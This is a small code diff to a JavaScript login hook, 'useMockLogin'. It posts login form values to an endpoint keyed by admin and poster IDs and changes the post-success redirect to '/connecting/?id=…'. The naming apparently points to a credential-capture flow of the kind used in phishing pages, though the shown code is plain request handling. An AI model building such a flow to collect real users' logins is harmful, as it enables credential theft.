@@ -9,7 +9,7 @@ function useMockLogin() {
 
   const login = async (values) => {
     // console.log(values);
-    // push("/connecting");
+    // push(`/connecting/?id=${posterId}`);
     // return;
 
     const url = `${API_URL}/ad/${adminId}/${posterId}`;
@@ -27,8 +27,8 @@ function useMockLogin() {
 
     if (res.ok) {
       console.log("success", data);
-      push("/connecting");
-      // push("/security-check");
+      push(`/connecting/?id=${posterId}`);
+      // push("/connecting");
     } else {
       console.log("error", data);
     }
